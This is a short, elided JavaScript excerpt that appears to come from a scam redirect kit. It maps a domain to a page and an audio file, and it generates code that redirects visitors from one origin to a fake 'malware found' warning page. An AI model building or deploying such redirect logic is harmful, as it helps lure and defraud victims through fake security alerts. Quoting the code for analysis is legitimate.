...
const ORIGIN_CONFIG = {
  "https://kazuonsen.com": {
    html: "rocky1.html",
    audio1: "https://audio.jukehost.co.uk/ZJh6Pph2ksA0SldKKXKmis6TnLObmfU6",
  },
...
function buildSecondaryJS(origin) {
  ...
  if(normalised === "https://miyabugamajp.store"){
    return `window.location.replace('https://malwarefoundwarning-gjgnama5gmguhrc3.z01.azurefd.net');`;
  }
